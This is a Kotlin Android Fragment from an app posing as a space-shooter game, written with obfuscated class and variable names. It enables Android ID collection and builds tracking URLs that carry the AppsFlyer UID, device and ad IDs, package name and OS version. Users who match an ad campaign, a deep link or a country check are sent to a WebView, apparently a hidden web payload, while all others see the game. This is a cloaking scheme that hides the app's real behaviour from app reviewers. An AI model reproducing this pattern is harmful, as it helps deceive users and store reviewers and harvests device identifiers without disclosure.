package com.game.space.shooter2a.waxzzxs

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.game.space.shooter2a.Sooocixcjxc.Companion.oakaskoa
import com.game.space.shooter2a.Sooocixcjxc.Companion.ovkvcok
import com.game.space.shooter2a.R
import com.game.space.shooter2a.Xoxpxisudys
import com.my.tracker.MyTracker
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class Vdoxpzijcuh : Fragment() {
    private lateinit var fudisiok: Context

    val onibibj: SharedPreferences by inject(named("SharedPreferences"))



    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val ciuvhck = onibibj.getString("apps", null)
        val zzappa = Build.VERSION.RELEASE
        val eioidjsdjixz = onibibj.getString("appCamp", null)
        val foofid = "sub_id_1="

        val ovkcc = onibibj.getString("wv", null)
        val rokd = onibibj.getString("countryDev", null)
        val rodis = "com.game.space.shooter2a"
        val onkbjinbjnb = "deviceID="
        val obovpvbl = onibibj.getString("country", null)
        val ieirods = "sub_id_6="


        val ovkb = "ad_id="
        val onibnodos = onibibj.getString("mainId", null)
        val injbvkoc = Intent(activity, Goxixjusa::class.java)
        val wosiodksa = "sub_id_4="

        val wosid = onibibj.getString("deepSt", null)
        val obivbjvbji = "deeporg"
        val kcoixod = onibibj.getString(oakaskoa, null)
        val fokdfjicx = "sub_id_5="

        val qpossiijs = MyTracker.getTrackerParams()
        qpossiijs.setCustomUserId(kcoixod)
        val nonkbkonboivjc = "naming"
        val papapassa = AppsFlyerLib.getInstance().getAppsFlyerUID(fudisiok)
        val udookxzkoc = Intent(activity, Xoxpxisudys::class.java)

        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        onibibj.edit().putString(ovkvcok, papapassa).apply()

        val cixj = "$ovkcc$foofid$eioidjsdjixz&$onkbjinbjnb$papapassa&$ovkb$onibnodos&$wosiodksa$rodis&$fokdfjicx$zzappa&$ieirods$nonkbkonboivjc"
        val lxozkzo = "$ovkcc$onkbjinbjnb$kcoixod&$ovkb$kcoixod&$wosiodksa$rodis&$fokdfjicx$zzappa&$ieirods$nonkbkonboivjc"
        val irjhue = "$ovkcc$foofid$wosid&$onkbjinbjnb$papapassa&$ovkb$onibnodos&$wosiodksa$rodis&$fokdfjicx$zzappa&$ieirods$obivbjvbji"
        val xijc = "$ovkcc$foofid$wosid&$onkbjinbjnb$kcoixod&$ovkb$kcoixod&$wosiodksa$rodis&$fokdfjicx$zzappa&$ieirods$obivbjvbji"

        when(ciuvhck) {
            "1" ->
                if(eioidjsdjixz!!.contains("tdb2")) {
                    onibibj.edit().putString("link", cixj).apply()
                    onibibj.edit().putString("WebInt", "campaign").apply()
                    startActivity(injbvkoc)
                    activity?.finish()
                } else if (wosid!=null||rokd!!.contains(obovpvbl.toString())) {

                    onibibj.edit().putString("link", irjhue).apply()
                    onibibj.edit().putString("WebInt", "deepLink").apply()
                    startActivity(injbvkoc)
                    activity?.finish()
                } else {
                    startActivity(udookxzkoc)
                    activity?.finish()
                }
            "0" ->
                if(wosid!=null) {
                    onibibj.edit().putString("link", xijc).apply()
                    onibibj.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(injbvkoc)
                    activity?.finish()
                } else if (rokd!!.contains(obovpvbl.toString())) {
                    Log.d("WebTesting", lxozkzo)
                    onibibj.edit().putString("link", lxozkzo).apply()
                    onibibj.edit().putString("WebInt", "geo").apply()
                    startActivity(injbvkoc)
                    activity?.finish()
                } else {
                    startActivity(udookxzkoc)
                    activity?.finish()
                }
        }
    }



    override fun onAttach(context: Context) {
        super.onAttach(context)
        fudisiok = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.foigfi, container, false)
    }
}
